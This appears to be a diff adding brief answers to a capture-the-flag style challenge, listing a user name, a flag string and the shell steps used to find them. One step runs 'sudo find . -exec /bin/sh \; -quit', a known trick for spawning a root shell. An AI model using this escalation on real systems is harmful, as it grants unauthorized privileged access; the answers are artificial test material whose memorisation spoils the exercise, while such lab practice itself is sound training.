@@ -1,0 +1,19 @@
+Qn 1 => ??
+Qn 2 => ??
+
+Steps:
+1. grep -o ".*.*.*:T.*" newusers.log | sort -u
+
+Qn 3 => Tonie Beavers
+
+Steps:
+1. cd toniebeavers
+
+Qn 4 => s3arCh1ng-_4_An5w3rz
+
+Steps:
+1. ls -Rial
+2. cd ./network/c/y/b/e/r/a/s/s/e/m/b/l/y/239/47/96/54
+3. sudo find . -exec /bin/sh \; -quit
+4. cat .code.sh
+
